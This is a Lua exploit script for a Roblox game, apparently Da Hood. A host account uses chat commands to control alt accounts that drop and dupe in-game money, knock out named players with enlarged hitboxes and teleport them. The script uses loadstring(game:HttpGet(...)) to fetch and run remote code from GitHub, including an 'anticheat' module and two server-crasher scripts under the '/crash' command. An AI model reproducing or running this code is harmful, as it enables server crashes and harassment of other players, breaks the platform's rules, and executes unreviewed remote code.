-- removed the whitelist part.

getgenv().Settings = {
    Host = 123456789,
    Prefix = "/",
    AdMsg = "Encrypt Alt Control",
    FPS = 10
}

getgenv().Alts = {
    123456789,
    123456789,
    123456789,
}

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local player = game:service"Players".LocalPlayer
local IsHost = false
if player.UserId == Settings['Host'] then
    IsHost = true
else
    setfpscap(Settings['FPS'])
    game:service"RunService":Set3dRenderingEnabled(false)
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")

    ScreenGui.Parent = game.CoreGui
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    Frame.Parent = ScreenGui
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
    Frame.BorderSizePixel = 100
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.Size = UDim2.new(1, 0, 1, 0)

    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.Position = UDim2.new(0.43553561, 0, 0.461769104, 0)
    TextLabel.Size = UDim2.new(0, 200, 0, 50)
    TextLabel.Font = Enum.Font.GothamMedium
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextSize = 28.000    
    TextLabel.Text = player.Name
    settings().Physics.PhysicsEnvironmentalThrottle = 1
    settings().Rendering.QualityLevel = 'Level01'
    for i,v in pairs(game:GetDescendants()) do
        if v:IsA("Part") then
            v.Material = Enum.Material.Pavement
            v.Transparency = 1
        elseif v:IsA("Decal") then
            v:Destroy()
        elseif v:IsA("Texture") then
            v:Destroy()
        elseif v:IsA("MeshPart") then
            v.TextureID = 0
            v.Transparency = 1
        elseif v.Name == "Terrian" then
            v.WaterReflectace = 1
            v.WaterTransparency = 1
        elseif v:IsA("SpotLight") then
            v.Range = 0
            v.Enabled = false
        elseif v:IsA("WedgePart") then
            v.Transparency = 1
        elseif v:IsA("UnionOperation") then
            v.Transparency = 1
        end
    end
end

player.Idled:Connect(function()
    game:service"VirtualUser":Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    game:service"VirtualUser":Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

local Dropping = false
local Blocking = false
local Cashauraing = false
loadstring(game:HttpGet("https://raw.githubusercontent.com/fzW2s/1SvY/main/modules/anticheat.lua"))()

local LocationSetups = {
    bank = {"-388,21,-336","-388,21,-327","-388,21,-318","-388,21,-309","-388,21,-300","-388,21,-291","-388,21,-282","-388,21,-273","-388,21,-264","-388,21,-255","-388,21,-246","-388,21,-237","-388,21,-228","-375,21,-336","-375,21,-327","-375,21,-318","-375,21,-309","-375,21,-300","-375,21,-291","-375,21,-282","-375,21,-273","-375,21,-264","-375,21,-255","-375,21,-246","-375,21,-237","-375,21,-228","-360,21,-336","-360,21,-327","-360,21,-318","-360,21,-309","-360,21,-300","-360,21,-291","-360,21,-282","-360,21,-273","-360,21,-264","-360,21,-255","-360,21,-246","-360,21,-237","-360,21,-228"},
    club = {"-282,-7,-348","-274,-7,-348","-266,-7,-348","-258,-7,-348","-250,-7,-348","-282,-7,-357","-274,-7,-357","-266,-7,-357","-258,-7,-357","-250,-7,-357","-282,-7,-362","-274,-7,-362","-266,-7,-362","-258,-7,-362","-250,-7,-362","-282,-7,-367","-274,-7,-367","-266,-7,-367","-258,-7,-367","-250,-7,-367","-282,-7,-372","-274,-7,-372","-266,-7,-372","-258,-7,-372","-250,-7,-372","-282,-7,-377","-274,-7,-377","-266,-7,-377","-258,-7,-377","-250,-7,-377","-282,-7,-382","-274,-7,-382","-266,-7,-382","-258,-7,-382","-250,-7,-382","-248,0,-342","-260,0,-341","-271,0,-341","-281,0,-341"},
    train = {"553,35,-56","553,35,-66","553,35,-76","553,35,-86","553,35,-96","553,35,-106","568,35,-56","568,35,-66","568,35,-76","568,35,-86","568,35,-96","568,35,-106","688,35,-141","679,35,-141","670,35,-141","661,35,-141","652,35,-141","643,35,-141","634,35,-141","625,35,-141","616,35,-141","607,35,-141","688,35,-156","679,35,-156","670,35,-156","661,35,-156","652,35,-156","643,35,-156","634,35,-156","625,35,-156","616,35,-156","607,35,-156","586,34,-142","579,34,-135","566,34,-122","572,34,-115","583,34,-127","593,34,-138"},
    admin = {"-826,-40,-617","-826,-40,-605","-826,-40,-593","-826,-40,-581","-826,-40,-569","-826,-40,-557","-845,-40,-617","-845,-40,-605","-845,-40,-593","-845,-40,-581","-845,-40,-569","-845,-40,-557","-864,-40,-617","-864,-40,-605","-864,-40,-593","-864,-40,-581","-864,-40,-569","-864,-40,-557","-879,-40,-617","-879,-40,-605","-879,-40,-593","-879,-40,-581","-879,-40,-569","-879,-40,-557","-898,-40,-617","-898,-40,-605","-898,-40,-593","-898,-40,-581","-898,-40,-569","-898,-40,-557","-918,-40,-617","-918,-40,-605","-918,-40,-593","-918,-40,-581","-918,-40,-569","-918,-40,-557","-816,-33,-643","-927,-33,-642","-873,-33,-521"},
}

local TPAREAS = {
    Admin = "-871,-33,-662",
    Bank = "-377,21,-361",
    Club = "-266,0,-428",
    Train = "600,47,-117",
}

game:service"RunService".Stepped:Connect(function()
    if Dropping == true then
        game:service"ReplicatedStorage".MainEvent:FireServer("DropMoney",10000)
    end
    if Blocking == true then
        game:service"ReplicatedStorage".MainEvent:FireServer("Block",true)
    end
    if Cashauraing == true then
        for i,v in pairs(workspace.Ignored.Drop:GetChildren()) do
            if v:IsA("Part") and (v.Position-player.Character.HumanoidRootPart.Position).Magnitude <= 15 then
                fireclickdetector(v:FindFirstChild("ClickDetector"))
            end
        end
    end
end)

local loopdestroying = false

workspace.Ignored.Drop.ChildAdded:Connect(function(item)
    if item:IsA("Part") and loopdestroying == true then
        repeat wait() until item.Parent ~= nil or item.Parent.Name == 'Drop'
        item:Destroy()
    end
end)

local function CheckPlr(userId)
    for i,v in pairs(game.Players:GetChildren()) do
        if v.UserId == tonumber(userId) then
            return true
        end
    end
    return false
end

local function FormatAlts()
    local new = {}
    for i,v in pairs(Alts) do
        if CheckPlr(v) == true then
            table.insert(new,tonumber(v))
        end
    end
    return new
end

local function saymsg(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
end

local function CheckPlr2(arg)
    for i,v in pairs(game.Players:GetChildren()) do
        if (string.sub(string.lower(v.Name),1,string.len(arg))) == string.lower(arg) then
            return v.Name
        end
        if (string.sub(string.lower(v.DisplayName),1,string.len(arg))) == string.lower(arg) then
            return v.Name
        end
    end
    return nil
end

local handSize
coroutine.resume(coroutine.create(function()
    repeat wait() until workspace.Players:FindFirstChild(player.Name)
    handSize = player.Character:FindFirstChild("RightHand").Size
end))
local function reach(boolean)
    if boolean == true then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if string.find(v.Name,"Hand") then
                pcall(function()
                    v.Massless = true
                    v.Size = Vector3.new(20,20,20)
                    v.Transparency = .99
                    v.CanCollide = true
                end)
            end
        end
    elseif boolean == false then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if string.find(v.Name,"Hand") then
                pcall(function()
                    v.Massless = false
                    v.Size = handSize
                    v.Transparency = 0
                    v.CanCollide = false
                end)
            end
        end
    end
end

local function KnockPlr(plr_name)
    local data = CheckPlr2(plr_name)
    if data == nil then
        return false
    end
    local Target = game.Players[data]
    if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == false then
        local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        repeat
            pcall(function()
                reach(true)
                local combat = game.Players.LocalPlayer.Character:FindFirstChild("Combat") or game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
                if combat then
                    if KNOCKING == false then
                        reach(false)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                        return false
                    end
                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
                        game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
                    end
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
                    game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
                end
            end)
            wait(0.01)
        until Target.Character.BodyEffects:FindFirstChild("K.O").Value == true
        reach(false)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
        return Target.Name
    end
    return false
end

local function cmds(msg, plr)
    if IsHost == false then
        local op = game:service"Players":GetPlayerByUserId(plr)
        if op and msg then
            if msg:lower() == Settings['Prefix'].."bring" then
                player.Character.HumanoidRootPart.CFrame = op.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,-2)
            elseif msg:lower() == Settings['Prefix'].."drop" then
                Dropping = true
                Blocking = true
            elseif msg:lower() == Settings['Prefix'].."stop" then
                Blocking = false
                Dropping = false
                Cashauraing = false
                wait(1)
                game:service"ReplicatedStorage".MainEvent:FireServer("Block",false)
            elseif msg:lower() == Settings['Prefix'].."lock" then
                player.Character.HumanoidRootPart.Anchored = true
            elseif msg:lower() == Settings['Prefix'].."unlock" then
                if workspace:FindFirstChild("AirlockPeice") then
                    workspace:FindFirstChild("AirlockPeice"):Destroy()
                end
                player.Character.HumanoidRootPart.Anchored = false
            elseif msg:lower() == Settings['Prefix'].."airlock" then
                if workspace:FindFirstChild("AirlockPeice") then
                    workspace:FindFirstChild("AirlockPeice"):Destroy()
                end
                player.Character.HumanoidRootPart.Anchored = false
                local Part = Instance.new("Part",workspace)
                Part.Name = "AirlockPeice"
                Part.Size = Vector3.new(5,2,5)
                Part.Transparency = 1
                Part.CFrame = player.Character.HumanoidRootPart.CFrame*CFrame.new(0,10,0)
                Part.Anchored = true
                player.Character.HumanoidRootPart.CFrame=workspace:FindFirstChild("AirlockPeice").CFrame*CFrame.new(0,1,0)
                wait(2)
                player.Character.HumanoidRootPart.Anchored = true
            elseif msg:lower() == Settings['Prefix'].."reset" then
                player.Character.Humanoid.Health = 0
                for i,v in pairs(player.Character:GetChildren()) do
                    if v:IsA("MeshPart") then
                        v:Destroy()
                    end
                end
            elseif msg:lower() == Settings['Prefix'].."god" then
                player.Character.BodyEffects:FindFirstChild("Attacking"):Destroy()
            end
            local OLDMSG = msg
            msg = msg:lower():split(' ')
            if msg[1] and msg[2] then
                if msg[1] == Settings['Prefix'].."setup" then
                    local NewAlts = FormatAlts()
                    local Location = LocationSetups[msg[2]]
                    for i,v in pairs(NewAlts) do
                        local x,y,z = Location[i]:split(",")[1],Location[i]:split(",")[2],Location[i]:split(",")[3]
                        if player.UserId == v then
                            player.Character.HumanoidRootPart.CFrame=CFrame.new(x,y,z)
                        end
                    end
                elseif msg[1] == Settings['Prefix'].."remove" then
                    if player.Name:lower():find(msg[2]) then
                        game:Shutdown()
                    end
                elseif msg[1] == Settings['Prefix'].."loopdestroy" then
                    if msg[2] == 'on' then
                        loopdestroying = true
                    elseif msg[2] == 'off' then
                        loopdestroying = false
                    end
                elseif msg[1] == Settings['Prefix'].."wallet" then
                    if msg[2] == 'on' then
                        player.Backpack:FindFirstChild("Wallet").Parent = player.Character
                    elseif msg[2] == 'off' then
                        player.Character:FindFirstChild("Wallet").Parent = player.Backpack
                    end
                elseif msg[1] == Settings['Prefix'].."crash" then
                    if player.UserId == Alts[1] or player.UserId == Alts[2] or player.UserId == Alts[3] then
                        setfpscap(60)
                        if msg[2] == 'encrypt' then
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
                            game:service"RunService":Set3dRenderingEnabled(true)
                            game.CoreGui:FindFirstChild("ScreenGui"):Destroy()
                        elseif msg[2] == 'swag' then
                            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                            game:service"RunService":Set3dRenderingEnabled(true)
                            game.CoreGui:FindFirstChild("ScreenGui"):Destroy()
                        end
                    end
                elseif msg[1] == Settings['Prefix'].."fps" then
                    if tonumber(msg[2]) then
                        setfpscap(tonumber(msg[2]))
                    end
                elseif msg[1] == Settings['Prefix'].."say" then
                    saymsg(OLDMSG:gsub(Settings['Prefix'].."say ",""))
                elseif msg[1] == Settings['Prefix'].."tp" then
                    if player.UserId == Alts[1] then
                        player.Character.HumanoidRootPart.Anchored = false
                        local theplace = ""
                        if msg[3] == nil or string.lower(msg[3]) == "host" then
                            theplace = "HOST"
                        elseif string.lower(msg[3]) == "admin" then
                            theplace = "Admin"
                        elseif string.lower(msg[3]) == "train" then
                            theplace = "Train"
                        elseif string.lower(msg[3]) == "club" then
                            theplace = "Club"
                        elseif string.lower(msg[3]) == "bank" then
                            theplace = "Bank"
                        end
                        if theplace then
                            local ko_data = KnockPlr(msg[2])
                            if ko_data then
                                local Target = game.Players[ko_data]
                                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == true then
                                    repeat
                                        pcall(function()
                                            if not Target.Character:FindFirstChild("GRABBING_CONSTRAINT") then
                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.UpperTorso.Position.X,Target.Character.UpperTorso.Position.Y+1.3,Target.Character.UpperTorso.Position.Z)
                                                game.ReplicatedStorage.MainEvent:FireServer("Grabbing",false)
                                            end
                                        end)
                                        wait(.5)
                                    until Target.Character:FindFirstChild("GRABBING_CONSTRAINT")
                                    if theplace == "Admin" then
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Admin'],",")[1],string.split(TPAREAS['Admin'],",")[2],string.split(TPAREAS['Admin'],",")[3])
                                    elseif theplace == "Train" then
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Train'],",")[1],string.split(TPAREAS['Train'],",")[2],string.split(TPAREAS['Train'],",")[3])
                                    elseif theplace == "Club" then
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Club'],",")[1],string.split(TPAREAS['Club'],",")[2],string.split(TPAREAS['Club'],",")[3])
                                    elseif theplace == "Bank" then
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Bank'],",")[1],string.split(TPAREAS['Bank'],",")[2],string.split(TPAREAS['Bank'],",")[3])
                                    elseif theplace == "HOST" then
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = op.Character.HumanoidRootPart.CFrame+op.Character.HumanoidRootPart.CFrame.lookVector*3.5
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.Angles(0, math.rad(180), 0)
                                    end
                                    wait(3)
                                    repeat
                                        if not Target.Character:FindFirstChild("GRABBING_CONSTRAINT") then
                                            wait(1)
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                                            return
                                        end
                                        pcall(function()
                                            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",false)
                                        end)
                                        wait(0.01) 
                                    until not Target.Character:FindFirstChild("GRABBING_CONSTRAINT")
                                    wait(1)
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                                end
                            end
                        end
                    end
                elseif msg[1] == Settings['Prefix'].."dupe" then
                    local DATANAME = CheckPlr2(msg[2])
                    if DATANAME then
                        if DATANAME ~= player.Name then
                            local newalts = FormatAlts()
                            local cords = {"4.5,0,0","0,0,4.5","-4.5,0,0","0,0,-4.5","3,0,3","-3,0,3","-3,0,-3","3,0,-3","6.5,0,0","5,0,3","3.5,0,5","0,0,6.5","-5,0,3","-3.5,0,5","-6.5,0,0","-5,0,-3","-3.5,0,-5","0,0,-6.5","5,0,-3","3.5,0,-5","4.5,7,0","0,7,4.5","-4.5,7,0","0,7,-4.5","3,7,3","-3,7,3","-3,7,-3","3,7,-3","6.5,7,0","5,7,3","3.5,7,5","0,7,6.5","-5,7,3","-3.5,7,5","-6.5,7,0","-5,7,-3","-3.5,7,-5","0,7,-6.5","5,7,-3","3.5,7,-5"}
                            local index = 0
                            local Target = game.Players[DATANAME]
                            for i,v in pairs(newalts) do
                                if v == player.UserId then
                                    index = index + 1
                                    local x,y,z = string.split(cords[index],",")[1],string.split(cords[index],",")[2],string.split(cords[index],",")[3]
                                    player.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.HumanoidRootPart.CFrame.X+tonumber(x),Target.Character.HumanoidRootPart.CFrame.Y+tonumber(y),Target.Character.HumanoidRootPart.CFrame.Z+tonumber(z))
                                else
                                    index = index + 1
                                end
                            end
                            wait(2)
                            Dropping = true
                            Blocking = true
                        else
                            Cashauraing = true
                        end
                    end
                end
            end
        end
    end
end

game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData) 
    local user = game:service"Players":GetPlayerByUserId(game.Players:GetUserIdFromNameAsync(messageData.FromSpeaker))
    local msg = messageData.Message
    if user.UserId == Settings['Host'] then
        cmds(msg, user.UserId)
    end
end)